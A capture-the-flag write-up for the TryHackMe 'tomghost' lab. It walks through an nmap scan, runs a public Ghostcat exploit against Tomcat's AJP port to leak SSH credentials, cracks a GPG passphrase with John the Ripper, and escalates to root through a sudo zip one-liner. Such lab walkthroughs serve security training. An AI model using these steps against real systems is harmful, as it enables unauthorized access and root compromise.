# TryHackMe-tomghost-CTF

Writeup for CTF tomghost avaiable on https://www.tryhackme.com (https://www.tryhackme.com/room/tomghost)

The challange is to find the flags contained user.txt and root.txt

First of all i will set nash variable for my ip and for victims ip so I will call them $V_IP (victims) $M_IP (my tryhackme vpn IP).

I will nmap scan the machine (I'm root so the scan would be syn scan by default) saving the output in nmap_syn_def

`nmap -A $V_IP -oN nmap_syn_def`

Ouput is:

>PORT     STATE SERVICE    VERSION
>22/tcp   open  ssh        OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
>| ssh-hostkey: 
>|   2048 f3:c8:9f:0b:6a:c5:fe:95:54:0b:e9:e3:ba:93:db:7c (RSA)
>|   256 dd:1a:09:f5:99:63:a3:43:0d:2d:90:d8:e3:e1:1f:b9 (ECDSA)
>|_  256 48:d1:30:1b:38:6c:c6:53:ea:30:81:80:5d:0c:f1:05 (ED25519)
>53/tcp   open  tcpwrapped
>8009/tcp open  ajp13      Apache Jserv (Protocol v1.3)
>| ajp-methods: 
>|_  Supported methods: GET HEAD POST OPTIONS
>8080/tcp open  http       Apache Tomcat 9.0.30
>|_http-favicon: Apache Tomcat
>|_http-open-proxy: Proxy might be redirecting requests
>|_http-title: Apache Tomcat/9.0.30

I will visit $V_IP:8080 and try to find hidden paths with dirb, but neither I found somethin useful neither I could access tomcat manager paths

On the web I found that "ghostcat" is vulnerability for Tomcat (here for details -> https://www.chaitin.cn/en/ghostcat)

using searchsploit i find a python script exploting this vulnerability, it requires victim ip and ajp tomcat port as parameters, I copied it in my working directory and ran it:

`python 48143.py -p 8009 $V_IP`

It gives back some html containg some credentials:

...
  <display-name>Welcome to Tomcat</display-name>
  <description>
     Welcome to GhostCat
	skyfu*k:<password>
  </description>
...

 Those are valid ssh credentials for $V_IP so I'll use them to gain first access.
  
skyfu*k home directory contains two files: "credential.pgp" "tryhackme.asc", I will inspect them later, first step I use find to locate "user.txt" as I'm expecting to need no more exploitation to find it. In fact it's in user merlin's home.
  
Now it's time to inspect the other files, pgp is actually a gpg encrypted file and I guess tryhackme.asc is the secret key that you need to use for decryption.

I will import it:
  
`gpg --import tryhackme.asc`
  
and try to decpryt credential file:
  
`gpg --decpryt credentials.pgp`
  
output is:
  
>You need a passphrase to unlock the secret key for
>user: "tryhackme <stuxnet@tryhackme.com>"
>1024-bit ELG-E key, ID 6184FBCC, created 2020-03-11 (main key ID C6707170)
>
>gpg: gpg-agent is not available in this session
>Enter passphrase: 
  
I return to my host shell in order to get the secret key via scp:
  
`scp skyfuc*k$V_IP:/home/skyfu*k/tryhackme.asc .`
  
I will use gpg2john to obtain a john crackable file and crack it using rockyou.txt wordlist
  
`gpg2john tryhackme.asc > pgphash`
 
`john pgphash --wordlist=/usr/share/wordlist/rockyou.txt`
  
 It cracks the passphrase for user tryhackme, I'll go back to victims machine and use it to gpg decrypt credental.pgp, I've obtained the password for user merlin.
  
 I will now ssh into the victims machine using merlin's credentials.
  
 I will look at merlin sudo's permissions:
 
 `sudo -l -l`
  
  output is:
  
>  Matching Defaults entries for merlin on ubuntu:
 >   env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

>User merlin may run the following commands on ubuntu:
 >   (root : root) NOPASSWD: /usr/bin/zip
  
  I'll go to GTFOBins to see if I can use it to do some escalation (https://gtfobins.github.io/gtfobins/zip/#sudo)

I'll use what I found:
  
`sudo zip $(mktemp -u) /etc/hosts -T -TT 'sh #'`
`whoami`
> root
  
Now I'm able to cat /root/root.txtand we're done
